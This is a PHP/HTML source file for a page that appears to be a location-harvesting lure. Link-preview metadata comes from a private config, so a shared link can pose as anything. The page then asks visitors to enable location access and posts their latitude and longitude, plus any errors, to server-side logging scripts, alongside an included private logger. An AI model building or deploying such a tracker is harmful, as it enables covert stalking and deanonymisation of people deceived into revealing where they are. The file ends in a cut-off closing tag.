<?php
    include_once("../private/logger.php");
    $CONFIG_FILE = file_get_contents("../private/config.json");
    $CONFIG = json_decode($CONFIG_FILE);
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8"/>
        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
        <meta property="og:site_name" content="<?php echo $CONFIG->og_site_name; ?>"/>
        <meta property="og:title" content="<?php echo $CONFIG->og_title; ?>"/>
        <meta property="og:type" content="<?php echo $CONFIG->og_type ?>"/>
        <meta property="og:url" content="<?php echo $CONFIG->og_url; ?>"/>
        <meta property="og:description" content="<?php echo $CONFIG->og_description; ?>"/>
        <meta property="og:image" content="<?php echo $CONFIG->og_image; ?>"/>
        <meta property="twitter_card" content="<?php echo $CONFIG->twitter_card; ?>"/>
        <title><?php echo $CONFIG->title; ?></title>
        <link rel="icon" href="<?php echo $CONFIG->icon; ?>"/>
        <style>
            @keyframes header_shadow_animation{
                from{
                    text-shadow: 0 0 5px rgb(220, 220, 220), 0 0 10px rgb(255, 100, 100), 0 0 15px rgb(255, 50, 50), 0 0 20px rgb(255, 20, 20);
                }
                to{
                    text-shadow: 0 0 5px rgb(255, 220, 220), 0 0 10px rgb(255, 190, 190), 0 0 15px rgb(255, 170, 170);
                }
            }
            *{
                margin: 0;
                padding: 0;
                border: 0;
                font-family: sans-serif;
                outline: none;
            }
            body{
                background-color: black;
                overflow: hidden;
            }
            .header_container{
                text-align: center;
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                width: 100%;
                max-width: 1000px;
            }
            #header{
                color: white;
                font-size: 25px;
                animation-name: header_shadow_animation;
                animation-duration: 3s;
                animation-iteration-count: infinite;
                animation-direction: alternate;
            }
        </style>
    </head>
    <body>
    <div class="header_container">
        <h1 id="header">Welcome. Please enable location access to access this page!</h1>
    </div>
    </body>
    <script>
        window.addEventListener("load", () => {
            getLocation();
        });
        
        function setHeader(message)
        {
            document.getElementById("header").innerHTML = message;
        }
        
        function SendHTTP(url, method="GET", payload=null)
        {
            let HTTP = new XMLHttpRequest();
            HTTP.open(method, url);
            HTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            let payloadURL = new URLSearchParams(payload).toString();
            HTTP.send(payloadURL);
        }
        
        function logError(message)
        {
            let payloadJSON = {"err": message};
            SendHTTP("./errorlog.php", "POST", payloadJSON);
        }
        
        function getLocation()
        {
            if (!navigator.geolocation)
            {
                logError("Unsupported Browser Error.");
                return setHeader("Your browser does not support GeoLocation. Please try using different browser!");
            }
            try
            {
                navigator.geolocation.getCurrentPosition(logLocation, errorLocation)
            }
            catch (Err)
            {
                logError(`getCurrentPosition Error: ${Err}`);
                setHeader("An error has occured. Please try again later!");
            }
        }
        
        function logLocation(position)
        {
            setHeader(`Latitude: ${position.coords.latitude}<br/>Longitude: ${position.coords.longitude}`);
            let latitude = position.coords.latitude;
            let longitude = position.coords.longitude;
            payloadJSON = {"longitude": longitude, "latitude": latitude};
            SendHTTP("./geolog.php", "POST", payloadJSON);
        }
        
        function errorLocation(err)
        {
            logError(`Error Code: ${err.code} | Error Message: ${err.message}`);
            if (err.code == 1)
            {
                setHeader("Location permission denied. Please enable it to continue!");
            }
            else
            {
                setHeader("An error has occured. Please try rebooting your device!");
            }
        }
    </script>
</html
